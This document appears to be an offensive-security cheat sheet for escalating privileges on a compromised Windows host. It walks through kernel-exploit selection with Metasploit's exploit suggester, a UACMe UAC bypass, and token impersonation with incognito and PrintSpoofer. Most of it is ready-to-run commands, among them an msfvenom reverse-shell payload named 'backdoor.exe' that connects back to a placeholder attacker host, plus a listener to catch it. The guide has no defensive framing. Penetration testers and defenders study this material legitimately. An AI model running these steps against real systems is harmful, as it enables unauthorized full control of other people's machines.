# Windows Privilege Escalation (Kernel, UAC, Token Impersonation)

Three common escalation vectors once you have a low-privileged foothold on a
Windows host. Pick the vector based on what enumeration shows — don't jump
straight to the most complex one.

All addresses/paths are placeholders.

## Decision order

1. Try `getsystem` first — sometimes it just works.
2. Check patch level → kernel exploit.
3. Check privileges (`getprivs` / `whoami /priv`) → `SeImpersonatePrivilege` → token impersonation / Potato.
4. Already in local Administrators but medium integrity → UAC bypass.

## 1. Kernel exploits

```bash
# Quick automated check
meterpreter > getsystem
search local_exploit_suggester
use post/multi/recon/local_exploit_suggester
set SESSION <session_id>
run

# Manual — Windows-Exploit-Suggester
meterpreter > shell
C:\> systeminfo                     # copy full output
# on attacker box:
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database <db>.xls --systeminfo systeminfo.txt

# Apply a matching exploit
meterpreter > upload <exploit>.exe C:\Temp\
meterpreter > shell
C:\Temp> .\<exploit>.exe <technique_arg>
C:\Temp> whoami                     # → NT AUTHORITY\SYSTEM
```

## 2. UAC bypass (UACMe)

UAC prompts for consent (admin user) or credentials (standard user) before
privileged actions. If you're already in the local Administrators group but
running at medium integrity, UACMe's `Akagi64.exe` can auto-elevate a payload
using a known bypass technique, without triggering the prompt.

```bash
# Stage a payload + listener
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > backdoor.exe
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT <LPORT>
run -j

# Upload backdoor + UACMe binary, then trigger
meterpreter > upload backdoor.exe C:\Temp\
meterpreter > upload Akagi64.exe C:\Temp\
meterpreter > shell
C:\Temp> .\Akagi64.exe 23 C:\Temp\backdoor.exe
# 23 = one of UACMe's numbered bypass techniques (varies by Windows version)
```

The handler catches a new session running at high/elevated integrity.

## 3. Token impersonation (incognito / Potato)

Every process has an access token. **Delegation tokens** come from interactive
logons; **impersonation tokens** from non-interactive ones (services, network
auth). With `SeImpersonatePrivilege`, you can grab a privileged token sitting
in memory and run as that user.

```bash
meterpreter > pgrep explorer
meterpreter > migrate <explorer_pid>     # need a stable user-session process
meterpreter > getprivs                   # look for SeImpersonatePrivilege: Enabled

meterpreter > load incognito
meterpreter > list_tokens -u
# Delegation Tokens Available: DOMAIN\Administrator / NT AUTHORITY\SYSTEM

meterpreter > impersonate_token "DOMAIN\\Administrator"
# note the double backslash — required by meterpreter's parser
meterpreter > getuid
```

If `list_tokens -u` shows nothing useful, fall back to a **Potato attack**
(Rotten/Juicy/Sweet Potato, PrintSpoofer). These force the creation of a
SYSTEM token via a local NTLM relay trick, then impersonate it — a fallback,
not the first thing to try.

```bash
meterpreter > upload PrintSpoofer64.exe C:\Temp\
meterpreter > shell
C:\Temp> .\PrintSpoofer64.exe -i -c cmd
```

## Notes

- `migrate` to `explorer.exe` before checking tokens — SYSTEM processes don't
  carry domain-user delegation tokens the way a user-session process does.
- `SeImpersonatePrivilege` is extremely common on service accounts (IIS, SQL
  Server, scheduled tasks) — always worth checking early.
- Potato-style attacks are a fallback for when no usable token already exists,
  not the default first move.
